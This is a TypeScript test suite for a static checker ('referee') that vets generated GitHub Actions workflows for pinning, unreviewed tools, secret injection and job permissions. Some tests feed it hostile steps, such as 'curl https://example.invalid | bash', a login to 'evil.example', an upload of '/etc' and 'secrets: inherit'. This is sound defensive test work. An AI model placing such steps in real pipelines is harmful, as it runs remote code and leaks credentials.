// Plan B Task 7 Part 2, sub-task 7a: the referee's static checks. Written first (strict test-first).
// The referee reads the finished files, never the renderer's intentions: every test hands it YAML text, most of it made by
// the real renderer and stepsToYaml, some of it hand-written and hostile.
import { centralWorkflowPath } from '../src/engine/central-path.js';
import { Document, parseDocument } from 'yaml';
import { NO_SCANS } from '../src/engine/job-rules.js';
import { describe, expect, it } from 'vitest';
import { JOB_PERMISSIONS, JOB_STEP_POLICY, pipegenLines, referee, type Linters, type RefereeDeps, type RefereeIssue, type RefereeReport } from '../src/engine/referee.js';
import { gateJobList, jobIdFor } from '../src/engine/gate-job-list.js';
import { jobOutputsFor } from '../src/engine/job-rules.js';
import { dedupeJobSteps, RenderError, renderFindRunStep, renderGateStep, renderJobPrelude, renderNightlyStep, renderPlatformStep, renderProjectScript, renderScrub, renderStep, renderUpload, scrubbedPath, stepsToYaml, type RenderContext, type RenderedStep, type RenderResult } from '../src/engine/render-step.js';
import { resultArtifactName } from '../src/engine/artifact-names.js';
import { NEED_ID_CATEGORY, NEED_IDS } from '../src/engine/need-ids.js';
import { emptyRepoFiles } from '../src/read/quality.js';
import { GATE_CHECK_NAME, type Capabilities, type CreatedFile, type ExistingWorkflow, type Need, type PipelineDraft, type ReviewedTool, type StepSpec } from '../src/types.js';
import { stub } from './helpers/linter-stub.js';
import { entry, gateEntry, platform, profile, reviewedList, service, specFor, scansFor } from './helpers/render.js';
import { fake } from './helpers/secret-repo.js';
import { renderGateUploads, renderStage as renderStageC1c } from '../src/engine/render-step.js';
import { isStagedTool } from '../src/engine/tool-flags.js';

// ---------- builders ----------

const sha = (c: string): string => c.repeat(40);
/** `${{ secrets.NAME }}`, built at run time (test/no-secret-literals.test.ts) */
const ref = (n: string): string => ['${{', `secrets.${n}`, '}}'].join(' ');
/** The OIDC permission and the login inputs, spelled at run time for the same reason. */
const OIDC = ['id', 'token'].join('-');
const loginInputs = (): Record<string, string> => Object.fromEntries([['username', '${{ github.actor }}'], [['pass', 'word'].join(''), ref('GITHUB_TOKEN')]]);
/** A spec field or job key named `secrets`, set at run time. */
const SEC_FIELD = ['sec', 'rets'].join('');
const IMG = `ghcr.io/o/app@sha256:${'a'.repeat(64)}`;
const svc = service({ name: 'app', path: '.', dockerfile: 'Dockerfile', scripts: ['test', 'lint'], envVars: ['STRIPE_KEY'] });
const prof = { ...profile([svc]), repoFiles: { ...emptyRepoFiles(), kubernetes: true } };
const ctx: RenderContext = { profile: prof, targets: { image: IMG, url: 'http://localhost:8080' } };
const caps = (over: Partial<Capabilities> = {}): Capabilities => ({
  branchProtection: true, environments: false, envRequiredReviewers: false, deploymentBranchPolicies: false, attestations: true, codeScanning: true, keylessSigningAllowed: true, ...over,
});
const needFor = (t: ReviewedTool): string => t.categories.find((c) => (NEED_IDS as readonly string[]).includes(c) && c !== 'platform') ?? 'sast';
const needOf = (id: string, blocking = true, svcName?: string): Need => ({
  id, layer: 'merge', category: (NEED_ID_CATEGORY as Record<string, string>)[id] ?? id, ...(svcName === undefined ? {} : { service: svcName }), why: 'test', blocking, floor: false,
});
const specOf = (id: string, over: Partial<StepSpec> = {}): StepSpec => {
  const t = entry(id);
  return specFor(t, { needId: needFor(t), service: 'app', ...over });
};
function draftOf(steps: StepSpec[], over: Partial<PipelineDraft> = {}): PipelineDraft {
  const needs = new Map<string, Need>();
  for (const s of steps) needs.set(`${s.needId}|${s.service ?? ''}`, needOf(s.needId, true, s.service));
  return {
    profile: prof, capabilities: caps(), needs: [...needs.values()], steps, created: [], notProven: [], testDecisions: [],
    layersSkipped: [], scoreboard: [], requireDeployApproval: false, skipped: [], suggestions: [], ...over,
  };
}
const prelude = (depth: '1' | '0' = '1'): RenderedStep[] => renderJobPrelude({ fetchDepth: depth }, platform()).steps;
const isRepoCode = (s: RenderedStep): boolean => s.id?.startsWith('repocode-') === true;
/** A tool's job steps as Plan G would compose them: checkout, the tool, the scrub of its result and the upload of the scrubbed copy (never after repo code). */
function toolJob(spec: StepSpec, c: RenderContext = ctx): RenderedStep[] {
  const t = entry(spec.tool.id);
  const r: RenderResult = renderStep(spec, t, platform(), c);
  const artifact = resultArtifactName(spec.needId, spec.service);
  const upload = r.output !== null && !r.steps.some(isRepoCode)
    ? [...(r.output.format === 'sarif' || r.output.format === 'zap-json' ? [renderScrub(artifact, r.output.path, t.id, r.output.format, GATE)] : []), renderUpload(artifact, scrubbedPath(r.output.path), platform())]
    : [];
  const stage = upload.length > 0 && isStagedTool(t.id) ? [renderStageC1c(artifact, t.id, GATE)] : [];   // C1c
  return [...prelude(r.fullHistory === true ? '0' : '1'), ...stage, ...r.steps, ...upload];
}
type Job = Record<string, unknown>;
const job = (steps: RenderedStep[], over: Job = {}): Job => ({ 'runs-on': 'ubuntu-latest', permissions: { contents: 'read' }, 'cache-mode': 'none', steps, ...over });
/**
 * The YAML text of a workflow, built with the yaml Document API and stepsToYaml, the way Plan G will. `raw`: the steps are
 * written as plain YAML instead (for the hostile steps the emitter itself refuses: the referee must refuse them too).
 */
function workflowText(jobs: Record<string, Job>, top: Record<string, unknown> = {}, raw = false): string {
  const doc = new Document();
  const plain = Object.fromEntries(Object.entries(jobs).map(([id, j]) => [id, Object.fromEntries(Object.entries(j).filter(([k]) => k !== 'steps'))]));
  doc.contents = doc.createNode({ name: 'pipegen', on: { pull_request: null }, permissions: {}, ...top, jobs: plain });
  for (const [id, j] of Object.entries(jobs)) {
    if (!Array.isArray(j.steps)) continue;
    const steps = j.steps as RenderedStep[];
    doc.setIn(['jobs', id, 'steps'], raw ? doc.createNode(steps.map(({ usesComment: _c, ...rest }) => rest)) : stepsToYaml(steps));
  }
  return doc.toString({ lineWidth: 0 });
}
const file = (content: string, path = '.github/workflows/pipegen.yml', over: Partial<CreatedFile> = {}): CreatedFile => ({ path, content, part: 'pipeline', reason: 'test', repo: 'app', ...over });
const wf = (jobs: Record<string, Job>, top: Record<string, unknown> = {}, path?: string): CreatedFile => file(workflowText(jobs, top), path);
/** A workflow whose steps did not go through stepsToYaml (hand-built, hostile). */
const rawWf = (jobs: Record<string, Job>): CreatedFile => file(workflowText(jobs, {}, true));

const LINTERS: Linters = { actionlint: async () => '/stub/actionlint', zizmor: async () => '/stub/zizmor' };
const quiet: RefereeDeps = { runLinters: async () => [] };
const run = (files: CreatedFile[], d: PipelineDraft, opts: { list?: ReviewedTool[]; deps?: RefereeDeps } = {}): Promise<RefereeReport> =>
  referee(files, d, platform(), opts.list ?? [...reviewedList(), GATE], LINTERS, 'gh-stub', opts.deps ?? quiet);
const checks = (r: RefereeReport): string[] => [...new Set(r.issues.map((i) => i.check))].sort();
const has = (r: RefereeReport, check: RefereeIssue['check']): boolean => r.issues.some((i) => i.check === check);
const show = (r: RefereeReport): string => r.issues.map((i) => `${i.check}: ${i.message}`).join('\n');

/** A small clean pipeline: gitleaks in its own job. */
const gitleaks = (): { spec: StepSpec; steps: RenderedStep[] } => {
  const spec = specOf('gitleaks', { needId: 'secrets', service: undefined });
  return { spec, steps: toolJob(spec) };
};

// fixture entries for pipegen's own actions (F1): the real ones come from Plan C (gate) and Plan H (watcher)
const ownAction = (id: string, path: string, s: string): ReviewedTool => ({
  id, categories: ['gate'], languages: ['any'],
  candidate: { id, name: id, kind: 'action', repo: 'crisworking/pipegen', version: 'v0.2.0', pin: { sha: s }, source: 'reviewed', reviewed: true, categories: ['gate'] },
  step: { action: { uses: `crisworking/pipegen/${path}@${s}`, with: { mode: path } }, output: { path: '', format: 'none' } },
  fixedInputs: { with: { mode: path } }, choices: {}, configFiles: [], reviewedBy: 'fixture', reviewedAt: '2026-10-29', proofs: 0,
});
// the gate entry has no fixed inputs and no choice (Plan C ruling B1/B3): `mode` and the rest are inputs the renderer sets
const GATE = gateEntry(sha('1'));
const WATCHER = ownAction('pipegen-watcher', 'watcher', sha('2'));

// ---------- the parity test ----------

describe('referee: the renderer and the referee agree', () => {
  it('referee: rendering all reviewed entries (every renderable one, via the real renderer and stepsToYaml) gives no issue', async () => {
    const jobs: Record<string, Job> = {};
    const specs: StepSpec[] = [];
    const refused: string[] = [];
    const p = platform();
    // several tools share a need id (two DAST tools, say); one need and service has one result and one job (ruling S4), so each later tool of a need gets a service of its own
    const profN = { ...prof, services: [service({ ...svc, scripts: [] }), service({ ...svc, name: 'script-app' }), ...Array.from({ length: 12 }, (_, i) => service({ ...svc, scripts: [], name: `app${i + 2}` }))] };
    const ctxN: RenderContext = { ...ctx, profile: profN };
    const perNeed = new Map<string, number>();
    for (const t of reviewedList()) {
      if (t.id === 'pipegen-gate') continue;   // pipegen's own gate action is rendered by the gate helpers (renderScrub, renderGateStep), not as a tool job
      if (t.categories.includes('platform') && !t.categories.includes('image-build')) continue;   // the platform actions are rendered below, by their helpers
      const nth = (perNeed.get(needFor(t)) ?? 0) + 1;
      perNeed.set(needFor(t), nth);
      const spec = specFor(t, { needId: needFor(t), service: nth === 1 ? 'app' : `app${nth}` });
      let steps: RenderedStep[];
      try {
        steps = t.id === 'docker-build-push-action'
          ? [...prelude(), renderPlatformStep('setup-buildx', p), renderPlatformStep('docker-login', p, loginInputs(), { registry: 'ghcr.io' }), ...renderStep(spec, t, p, { ...ctxN, targets: { image: 'ghcr.io/o/app:pr-1' } }).steps]
          : toolJob(spec, ctxN);
      } catch (e) {
        if (!(e instanceof RenderError)) throw e;
        refused.push(t.id);
        continue;
      }
      specs.push(spec);
      // the PR-time build (push false) is the listed check: it runs in image-build--<service>; image-publish is a separate job, not a listed check
      if (t.id === 'docker-build-push-action') jobs[jobIdFor(spec.needId, spec.service)] = job([...prelude(), ...renderStep(spec, t, p, { ...ctxN, targets: { image: 'ghcr.io/o/app:pr-1' } }).steps]);
      // a listed check runs in the job named for it (ruling 3 of C0b fix round 1), with the outputs the gate reads
      const outputs = jobOutputsFor(steps);
      jobs[t.id === 'docker-build-push-action' ? 'image-publish' : jobIdFor(spec.needId, spec.service)] = job(steps, {
        ...(t.id === 'docker-build-push-action' ? { permissions: { contents: 'read', packages: 'write' } } : {}), ...(Object.keys(outputs).length > 0 ? { outputs } : {}),
      });
    }
    // the helper-rendered platform actions, as Plan G uses them
    const sarif = '${{ runner.temp }}/pipegen-out/pipegen-out-sast--app/semgrep.sarif';
    // every job shape of JOB_STEP_POLICY, under its real job id (fix round 1): the step allowlist and the renderer agree
    const download = (): RenderedStep => renderPlatformStep('download-artifact', p, { name: 'pipegen-out-sast--app', path: '${{ runner.temp }}/pipegen-out/pipegen-out-sast--app' });
    const harden = renderStep(specFor(entry('bullfrog'), { needId: 'egress' }), entry('bullfrog'), p, ctx).steps;
    // each mode of the gate action in the job that runs it (Plan C ruling B3); baseline-check has its own gate mode since C3
    const gateAct = (mode: string): RenderedStep => ({ name: 'gate', uses: GATE.step.action?.uses as string, with: { mode, ...(mode === 'find-run' ? { layout: 'inline' } : {}) } });
    const watchAct: RenderedStep = { name: 'watch', uses: WATCHER.step.action?.uses as string, with: { mode: 'watcher' } };
    const [checkout] = prelude();
    const co = checkout as RenderedStep;
    jobs['code-scanning'] = job([download(), renderPlatformStep('upload-sarif', p, { sarif_file: sarif, category: 'pipegen-sast' })], { permissions: { contents: 'read', 'security-events': 'write', actions: 'read' } });
    jobs['baseline-check'] = job([download(), gateAct('baseline-check')], { permissions: { contents: 'read', actions: 'read' } });
    jobs.sign = job([
      co, download(),
      renderPlatformStep('docker-login', p, loginInputs(), { registry: 'ghcr.io' }),
      renderPlatformStep('attest', p, { 'subject-name': 'ghcr.io/o/app', 'subject-digest': `sha256:${'a'.repeat(64)}` }),
    ], { permissions: { contents: 'read', [OIDC]: 'write', packages: 'write', attestations: 'write' }, environment: 'pipegen-signing' });
    jobs['pipegen-verify'] = job([co, download(), gateAct('find-run')], { permissions: { contents: 'read', actions: 'read', packages: 'read', attestations: 'read' }, environment: 'pipegen-signing' });
    jobs.watch = job([co, watchAct], { permissions: { contents: 'read', issues: 'write', actions: 'read' } });
    jobs.notify = job([download()], { permissions: { contents: 'read', 'pull-requests': 'read', checks: 'read' } });
    jobs['merged-red'] = job([download()], { permissions: { contents: 'read', 'pull-requests': 'read', checks: 'read' } });
    jobs['pr-check'] = job([co], { permissions: { 'pull-requests': 'read' } });
    // the repo-wide secrets check: its job, and its base twin in base-scan (which checks out the base commit first, ruling 5)
    const repoWide = specOf('gitleaks', { needId: 'secrets', service: undefined });
    const repoWideSteps = toolJob(repoWide);
    jobs[['sec', 'rets'].join('')] = job(repoWideSteps, { outputs: jobOutputsFor(repoWideSteps) });
    const baseRun = renderStep(repoWide, entry('gitleaks'), p, { ...ctx, base: true });
    const baseArt = resultArtifactName('secrets', undefined, { base: true });
    const baseSteps = [...renderJobPrelude({ baseRef: true }, p).steps, renderStageC1c(baseArt, 'gitleaks', GATE), ...baseRun.steps, renderScrub(baseArt, baseRun.output?.path as string, 'gitleaks', 'sarif', GATE), renderUpload(baseArt, scrubbedPath(baseRun.output?.path as string), p)];
    jobs['base-scan'] = job(baseSteps, { permissions: { contents: 'read', actions: 'read' }, outputs: jobOutputsFor(baseSteps) });
    // the project's own scripts, for a service of their own (the tools above took the first service of each need)
    const scripts = [renderProjectScript({ kind: 'project-script', needId: 'unit-tests', service: 'script-app', script: 'test' }, p, ctxN).steps,
      renderProjectScript({ kind: 'project-script', needId: 'lint', service: 'script-app', script: 'lint' }, p, ctxN).steps];
    jobs['unit-tests--script-app'] = job(scripts[0] as RenderedStep[]);
    jobs['lint--script-app'] = job(scripts[1] as RenderedStep[]);
    const d = draftOf([...specs, repoWide], { profile: profN });
    d.needs.push(needOf('unit-tests', true, 'script-app'), needOf('lint', true, 'script-app'));
    // the nightly job: its step is nightlyStepInputs(draft) (final review fix round A, ruling 3)
    jobs.nightly = job([download(), renderNightlyStep(GATE, d)], { permissions: { contents: 'read', actions: 'read', issues: 'write' } });
    // the gate job: no checkout (ruling S21), the job list of this draft, and a needs entry for every job of it (ruling S4)
    const entries = gateJobList(d);
    jobs.gate = job([...harden, download(), renderGateStep(GATE, d), ...renderGateUploads(platform())], { name: GATE_CHECK_NAME.split(' / ')[1], if: 'always()', needs: entries.map((e) => e.job), permissions: { contents: 'read', actions: 'read', 'pull-requests': 'read' } });
    const r = await run([wf(jobs)], d, { list: [...reviewedList(), GATE, WATCHER] });
    for (const id of Object.keys(JOB_STEP_POLICY)) expect(Object.keys(jobs), id).toContain(id);
    expect(show(r)).toBe('');
    expect(r.ok).toBe(true);
    expect(r.demoted).toEqual([]);
    // the entries the renderer refuses are the documented ones (6c report), nothing else
    // (registry is a job service and skipped above with the platform entries)
    expect(refused.sort()).toEqual(['cosign', 'gosec', 'pypi-publish', 'schemathesis', 'scorecard-action', 'bandit', 'coverage-py', 'creosote', 'mypy', 'vulture'].sort());
    expect(specs.length).toBeGreaterThan(30);
  });
});

// ---------- pins ----------

describe('referee: pins', () => {
  const withStep = (step: RenderedStep): CreatedFile => wf({ check: job([...prelude(), step]) });
  it('referee: unpinned @v4 → unpinned issue', async () => {
    const r = await run([withStep({ name: 'x', uses: 'actions/checkout@v4', with: { 'persist-credentials': 'false', 'allow-unsafe-pr-checkout': 'false', 'fetch-depth': '1' } })], draftOf([]));
    expect(has(r, 'unpinned'), show(r)).toBe(true);
  });
  it('referee: central prefix at sha allowed, at @main rejected', async () => {
    // fix round 1 (ruling 2): only at the commit pipegen recorded, and with the called file in files (judged too)
    const called = { ...wf({ check: job([]) }, { on: { workflow_call: null } }, '.github/workflows/gate.yml'), repo: 'central' as const };
    const pinned = draftOf([], { centralPin: { repo: 'o/pipelines', sha: sha('c') } });
    const caller = (at: string): CreatedFile => wf({ pipegen: { name: 'pipegen', uses: `o/pipelines/.github/workflows/gate.yml@${at}`, permissions: { contents: 'read' } } });
    const ok = await run([caller(sha('c')), called], pinned);
    expect(show(ok)).toBe('');
    const bad = await run([caller('main'), called], pinned);
    expect(has(bad, 'unpinned'), show(bad)).toBe(true);
    // another owner's pipelines repo is not the central repo
    const other = await run([wf({ pipegen: { name: 'pipegen', uses: `evil/pipelines/.github/workflows/gate.yml@${sha('c')}`, permissions: { contents: 'read' } } })], draftOf([]));
    expect(has(other, 'unknown-pin'), show(other)).toBe(true);
  });
  it('referee: pipegen gate and watcher actions at the reviewed sha allowed; at another sha → unknown-pin', async () => {
    const list = [...reviewedList(), GATE, WATCHER];
    const step = (t: ReviewedTool, s: string): RenderedStep => (t.id === GATE.id
      ? { ...renderGateStep(GATE, draftOf([])), uses: (t.step.action?.uses as string).replace(/@.*$/, `@${s}`) }
      : { name: t.id, uses: (t.step.action?.uses as string).replace(/@.*$/, `@${s}`), with: { mode: t.fixedInputs.with?.mode as string } });
    const ok = await run([wf({ gate: job([step(GATE, sha('1')), ...renderGateUploads(platform())], { if: 'always()', permissions: { contents: 'read', actions: 'read', 'pull-requests': 'read' } }), watch: job([step(WATCHER, sha('2'))], { permissions: { contents: 'read', issues: 'write', actions: 'read' } }) })], draftOf([]), { list });
    expect(show(ok)).toBe('');
    for (const [t, other] of [[GATE, sha('3')], [WATCHER, sha('4')]] as const) {
      const r = await run([wf({ gate: job([step(t, other)], { permissions: { contents: 'read', actions: 'read' } }) })], draftOf([]), { list });
      expect(has(r, 'unknown-pin'), `${t.id}: ${show(r)}`).toBe(true);
    }
  });
  it('hostile: uses with a different sub-path at the same SHA → unknown-pin (S14)', async () => {
    const sarif = renderPlatformStep('upload-sarif', platform(), { sarif_file: '${{ runner.temp }}/pipegen-out/pipegen-out-sast/x.sarif', category: 'pipegen-sast' });
    const init = { ...sarif, uses: (sarif.uses as string).replace('/upload-sarif@', '/init@'), with: {} };
    const r = await run([wf({ 'code-scanning': job([init], { permissions: { contents: 'read', 'security-events': 'write', actions: 'read' } }) })], draftOf([]));
    expect(has(r, 'unknown-pin'), show(r)).toBe(true);
  });
  it('hostile: docker:// by tag → unpinned; at an unreviewed digest → unknown-pin', async () => {
    const tag = await run([withStep({ name: 'x', uses: 'docker://alpine:3.20' })], draftOf([]));
    expect(has(tag, 'unpinned'), show(tag)).toBe(true);
    const dig = await run([withStep({ name: 'x', uses: `docker://alpine@sha256:${'e'.repeat(64)}` })], draftOf([]));
    expect(has(dig, 'unknown-pin'), show(dig)).toBe(true);
  });
  it('hostile: a ./local action is refused, whether or not its file is in files (fix round 2, ruling 3)', async () => {
    const action = file('name: mine\nruns:\n  using: composite\n  steps:\n    - name: hi\n      run: echo hi\n      shell: bash\n', '.github/actions/mine/action.yml');
    for (const files of [[], [action]]) expect(has(await run([withStep({ name: 'x', uses: './.github/actions/mine' }), ...files], draftOf([])), 'unreviewed')).toBe(true);
    for (const bad of ['./../x', './.github/actions/../../x']) expect(has(await run([withStep({ name: 'x', uses: bad })], draftOf([])), 'unreviewed'), bad).toBe(true);
  });
  it('hostile: a reusable workflow at @main → unpinned', async () => {
    const r = await run([wf({ call: { uses: 'someone/workflows/.github/workflows/x.yml@main', permissions: { contents: 'read' } } })], draftOf([]));
    expect(has(r, 'unpinned'), show(r)).toBe(true);
  });
});

// ---------- only reviewed tools, the template ----------

describe('referee: only reviewed tools, and only as their template', () => {
  it('referee: project-script step running a script from Service.scripts accepted; unknown script name → unreviewed issue', async () => {
    const steps = renderProjectScript({ kind: 'project-script', needId: 'unit-tests', service: 'app', script: 'test' }, platform(), ctx).steps;
    const d = draftOf([], { needs: [needOf('unit-tests', true, 'app')] });
    const ok = await run([wf({ test: job(steps) })], d);
    expect(show(ok)).toBe('');
    const other = steps.map((s) => (s.id?.startsWith('repocode-') ? { ...s, run: (s.run as string).replace('"$nodebin/npm" test', '"$nodebin/npm" run build') } : s));
    const r = await run([wf({ test: job(other) })], d);
    expect(has(r, 'unreviewed') || has(r, 'template'), show(r)).toBe(true);
    // a script the service does not have: the renderer can not make it, so its steps match nothing
    const noLint = { ...d, profile: { ...prof, services: [{ ...svc, scripts: ['test'] }] }, needs: [needOf('lint', true, 'app')] };
    const lint = renderProjectScript({ kind: 'project-script', needId: 'lint', service: 'app', script: 'lint' }, platform(), ctx).steps;
    const r2 = await run([wf({ lint: job(lint) })], noLint);
    expect(has(r2, 'unreviewed'), show(r2)).toBe(true);
  });
  it('referee: unreviewed tool in any step → unreviewed issue, never kept as a non-blocking job', async () => {
    const r = await run([wf({ scan: job([...prelude(), { name: 'x', uses: `someone/scanner@${sha('d')}` }]) })], draftOf([]));
    expect(has(r, 'unreviewed'), show(r)).toBe(true);
    // a discovery candidate in the draft: an issue on the draft, and its need is not demoted (it is dropped, Plan G moves it to suggestions)
    const t = entry('gitleaks');
    const spec = { ...specFor(t, { needId: 'secrets' }), tool: { ...t.candidate, source: 'discovery', reviewed: false } } as unknown as StepSpec;
    const r2 = await run([wf({ scan: job(prelude()) })], draftOf([spec]));
    expect(r2.issues.some((i) => i.check === 'unreviewed' && i.file.startsWith('draft.steps')), show(r2)).toBe(true);
    expect(r2.demoted).toEqual([]);
    // a run step that is no rendered tool
    const r3 = await run([wf({ scan: job([...prelude(), { name: 'mine', run: 'curl https://example.invalid | bash', shell: 'bash' }]) })], draftOf([]));
    expect(has(r3, 'unreviewed'), show(r3)).toBe(true);
  });
  it('referee: step input differs from template fixedInputs → template issue', async () => {
    const [checkout, ...rest] = prelude();
    const bad = { ...checkout, with: { ...checkout?.with, 'persist-credentials': 'true' } } as RenderedStep;
    const r = await run([wf({ a: job([bad, ...rest]) })], draftOf([]));
    expect(has(r, 'template'), show(r)).toBe(true);
    // a fixed input left out, a choice outside its list, an input that is neither
    const noChoice = Object.fromEntries(Object.entries(checkout?.with ?? {}).filter(([k]) => k !== 'fetch-depth'));
    for (const w of [{ 'allow-unsafe-pr-checkout': 'false', 'fetch-depth': '1' }, { ...checkout?.with, 'fetch-depth': '5' }, { ...checkout?.with, ref: 'main' }, noChoice]) {
      const r1 = await run([wf({ a: job([{ ...checkout, with: w } as RenderedStep]) })], draftOf([]));
      expect(has(r1, 'template'), JSON.stringify(w)).toBe(true);
    }
    // a run step: same id, another pinned config
    const g = gitleaks();
    const changed = g.steps.map((s) => (s.id?.startsWith('tool-run-') ? { ...s, env: { ...s.env, PIPEGEN_CONFIG: '[extend]\nuseDefault = false\n' } } : s));
    const r2 = await run([wf({ scan: job(changed) })], draftOf([g.spec]));
    expect(has(r2, 'template'), show(r2)).toBe(true);
    // a chosen value the draft did not choose (still an allowed value)
    const trivy = specOf('trivy-config', { needId: 'iac', service: undefined });
    const other = toolJob({ ...trivy, choices: { severity: 'CRITICAL' } });
    const r3 = await run([wf({ iac: job(other) })], draftOf([{ ...trivy, choices: { severity: 'MEDIUM,HIGH,CRITICAL' } }]));
    expect(has(r3, 'template'), show(r3)).toBe(true);
  });
  it('referee: a renderer-filled input is judged by its own checker and condition (S15, whenWith)', async () => {
    const p = platform();
    const login = renderPlatformStep('docker-login', p, loginInputs(), { registry: 'ghcr.io' });
    const perms = { permissions: { contents: 'read', packages: 'write' } };
    expect(show(await run([wf({ 'image-publish': job([login], perms) })], draftOf([])))).toBe('');
    const elsewhere = { ...login, with: { ...login.with, registry: 'evil.example' } };
    expect(checks(await run([rawWf({ 'image-publish': job([elsewhere], perms) })], draftOf([])))).toContain('injection');
    const up = renderUpload('pipegen-out-secrets', '${{ runner.temp }}/pipegen-out/pipegen-out-secrets/gitleaks.sarif', p);
    const outside = { ...up, with: { ...up.with, path: '/etc' } };
    expect(has(await run([wf({ a: job([outside]) })], draftOf([])), 'template')).toBe(true);
  });
  it('a container action the renderer refuses (image by tag) is refused here too', async () => {
    const t = entry('scorecard-action');
    const step: RenderedStep = { name: 'x', uses: t.step.action?.uses as string, with: t.fixedInputs.with as Record<string, string> };
    const r = await run([wf({ scorecard: job([step]) })], draftOf([]));
    expect(has(r, 'unpinned'), show(r)).toBe(true);
  });
});

// ---------- expressions and secrets (S9) ----------

describe('referee: expressions and secrets', () => {
  const vitest = (): { spec: StepSpec; steps: RenderedStep[] } => {
    const spec = specOf('vitest-coverage', { needId: 'coverage', [SEC_FIELD]: ['STRIPE_KEY'] });
    return { spec, steps: toolJob(spec) };
  };
  it('a declared secret on the app-running step it was declared for passes', async () => {
    const v = vitest();
    const r = await run([wf({ coverage: job(v.steps) })], draftOf([v.spec]));
    expect(show(r)).toBe('');
  });
  it('hostile: ${{ secrets.X }} in run → injection', async () => {
    const r = await run([rawWf({ a: job([...prelude(), { name: 'x', run: `echo ${ref('STRIPE_KEY')}`, shell: 'bash' }]) })], draftOf([]));
    expect(has(r, 'injection'), show(r)).toBe(true);
  });
  it('hostile: an env name other than X → injection', async () => {
    const v = vitest();
    const steps = v.steps.map((s) => (s.env?.STRIPE_KEY === undefined ? s : { ...s, env: { ...Object.fromEntries(Object.entries(s.env).filter(([k]) => k !== 'STRIPE_KEY')), OTHER_NAME: ref('STRIPE_KEY') } }));
    const r = await run([rawWf({ coverage: job(steps) })], draftOf([v.spec]));
    expect(has(r, 'injection'), show(r)).toBe(true);
  });
  it('a secret outside the allowed set → permissions; pipegen\'s own and the declared ones are the set', async () => {
    const v = vitest();
    const steps = v.steps.map((s) => (s.env?.STRIPE_KEY === undefined ? s : { ...s, env: { ...s.env, DATABASE_URL: ref('DATABASE_URL') } }));
    const r = await run([wf({ coverage: job(steps) })], draftOf([v.spec]));
    expect(r.issues.some((i) => i.check === 'permissions' && /neither declared/.test(i.message)), show(r)).toBe(true);
  });
  it('a declared secret reaching a step that does not run the app → injection (R1-7)', async () => {
    const v = vitest();
    const g = gitleaks();
    const leaky = g.steps.map((s) => (s.id?.startsWith('tool-run-') ? { ...s, env: { ...s.env, STRIPE_KEY: ref('STRIPE_KEY') } } : s));
    const r = await run([wf({ scan: job(leaky) })], draftOf([g.spec, v.spec]));
    expect(has(r, 'injection'), show(r)).toBe(true);
    const onAction = await run([wf({ a: job(prelude().map((s, i) => (i === 0 ? { ...s, env: { STRIPE_KEY: ref('STRIPE_KEY') } } : s))) })], draftOf([v.spec]));
    expect(has(onAction, 'injection'), show(onAction)).toBe(true);
  });
  it('hostile: secrets inherit (every secret passed on) → permissions issue', async () => {
    const caller: Job = { name: 'pipegen', uses: `o/pipelines/.github/workflows/gate.yml@${sha('c')}`, permissions: { contents: 'read' }, [SEC_FIELD]: ['inh', 'erit'].join('') };
    const r = await run([wf({ pipegen: caller })], draftOf([]));
    expect(has(r, 'permissions'), show(r)).toBe(true);
  });
  it('an expression in a job key, a top-level env or a job if that pipegen does not write → injection', async () => {
    const g = gitleaks();
    for (const over of [{ name: '${{ github.head_ref }}' }, { if: "github.actor == 'x'" }, { env: { X: '${{ github.head_ref }}' } }, { 'runs-on': '${{ github.head_ref }}' }]) {
      const r = await run([wf({ scan: job(g.steps, over) })], draftOf([g.spec]));
      expect(has(r, 'injection'), JSON.stringify(over)).toBe(true);
    }
  });
});

// ---------- permissions (S17) ----------

describe('referee: permissions by exact job id', () => {
  const g = gitleaks();
  // no steps: the step allowlist of each job (JOB_STEP_POLICY, fix round 1) is tested on its own
  const withPerms = async (id: string, permissions: unknown, over: Job = {}, d = draftOf([g.spec])): Promise<RefereeReport> => run([wf({ [id]: job([], { permissions, ...over }) })], d);
  it('top-level permissions {} is required', async () => {
    for (const top of [{ permissions: { contents: 'read' } }, { permissions: 'read-all' }]) {
      expect(has(await run([wf({ scan: job(g.steps) }, top)], draftOf([g.spec])), 'permissions'), JSON.stringify(top)).toBe(true);
    }
    const doc = new Document();
    doc.contents = doc.createNode({ name: 'x', on: { push: null }, jobs: { scan: { 'runs-on': 'ubuntu-latest', permissions: { contents: 'read' }, 'cache-mode': 'none' } } });
    doc.setIn(['jobs', 'scan', 'steps'], stepsToYaml(g.steps));
    expect(has(await run([file(doc.toString({ lineWidth: 0 }))], draftOf([g.spec])), 'permissions')).toBe(true);
  });
  it('write-all, read-all or no permissions on a job → permissions issue', async () => {
    for (const p of ['write-all', 'read-all']) expect((await withPerms('scan', p)).issues.some((i) => i.check === 'permissions' && /never read-all or write-all/.test(i.message)), p).toBe(true);
    expect((await withPerms('scan', null)).issues.some((i) => i.check === 'permissions' && /declares no permissions/.test(i.message))).toBe(true);
    const none = await run([wf({ scan: Object.fromEntries(Object.entries(job(g.steps)).filter(([k]) => k !== 'permissions')) })], draftOf([g.spec]));
    expect(has(none, 'permissions')).toBe(true);
  });
  it('referee: job with packages: write outside sign job → permissions issue', async () => {
    expect(has(await withPerms('scan', { contents: 'read', packages: 'write' }), 'permissions')).toBe(true);
    expect(has(await withPerms('sign', { contents: 'read', packages: 'write' }), 'permissions')).toBe(false);
  });
  it('referee: base-scan with actions: read allowed; pipegen-verify with packages: read and attestations: read allowed; gate with pull-requests: read allowed; pr-check with pull-requests: read allowed', async () => {
    for (const [id, p] of [['base-scan', { contents: 'read', actions: 'read' }], ['pipegen-verify', { contents: 'read', actions: 'read', packages: 'read', attestations: 'read' }],
      ['gate', { contents: 'read', actions: 'read', 'pull-requests': 'read' }], ['pr-check', { 'pull-requests': 'read' }], ['code-scanning', { contents: 'read', 'security-events': 'write', actions: 'read' }]] as const) {
      const r = await withPerms(id, p);
      expect(has(r, 'permissions'), `${id}: ${show(r)}`).toBe(false);
    }
    // the same permissions on another job id are too much
    expect(has(await withPerms('t-gitleaks', { contents: 'read', actions: 'read' }), 'permissions')).toBe(true);
  });
  it('referee: watch job with contents: write → permissions issue', async () => {
    expect(has(await withPerms('watch', { contents: 'write', issues: 'write' }), 'permissions')).toBe(true);
  });
  it('referee: nightly and watch jobs with contents: read, actions: read, issues: write allowed; pull-requests: write → permissions issue', async () => {
    for (const id of ['nightly', 'watch']) {
      expect(has(await withPerms(id, { contents: 'read', actions: 'read', issues: 'write' }), 'permissions'), id).toBe(false);
      expect(has(await withPerms(id, { contents: 'read', actions: 'read', issues: 'write', 'pull-requests': 'write' }), 'permissions'), id).toBe(true);
    }
  });
